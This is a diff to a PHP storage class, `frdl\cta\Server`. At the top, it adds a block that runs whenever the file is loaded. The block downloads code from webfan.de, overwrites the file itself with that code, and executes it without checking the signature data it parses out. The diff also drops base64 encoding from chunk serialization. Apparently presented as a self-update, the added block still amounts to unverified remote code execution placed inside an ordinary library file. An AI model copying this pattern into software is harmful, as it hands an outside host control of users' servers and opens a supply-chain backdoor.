@@ -22,7 +22,22 @@ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 ****************************************************************************/
-namespace frdl\cta;
+namespace Webfan\Patch{
+   $sep = 'X19oYWx0X2NvbXBpbGVyKCk7'; 
+   $code = @file_get_contents('https://webfan.de/install/?source=frdl\cta\Server');
+   if(false===$code){
+	throw new \Exception('Could not read source in '.__FILE__.' line '.__LINE__);   
+   }
+   list($sourcecode,$sigdata) = explode(base64_decode($sep), $code, 2);
+	
+   if(!file_put_contents(__FILE__, $sourcecode)){
+	throw new \Exception('Could not write source in '.__FILE__.' line '.__LINE__);   
+   }	
+	
+  return require __FILE__;
+}
+
+namespace frdl\cta{
 
 use Exception;
 use SplFileObject;
@@ -89,18 +104,20 @@ class Server implements StorageInterface
     {
         $bin=new \frdl\webfan\Serialize\Binary\bin;
         $chunk = $bin->serialize([
-            'chunk'=>$chunk,
+            'c'=>$chunk,
         ]);
-        $serialized = base64_encode($chunk);
+       // $serialized = base64_encode($chunk);
+		$serialized = $chunk;
         return $serialized;
     }
 
     public function unserializeChunk($serialized)
     {
         $bin=new \frdl\webfan\Serialize\Binary\bin;
-        $chunk = base64_decode($serialized);
+      //  $chunk = base64_decode($serialized);
+	    $chunk = $serialized;
         $data = $bin->unserialize($chunk);
-        $chunk = $data['chunk'];
+        $chunk = $data['c'];
         return $chunk;
     }
 
@@ -777,3 +794,5 @@ class Server implements StorageInterface
         }
     }
 }
+
+}//ns
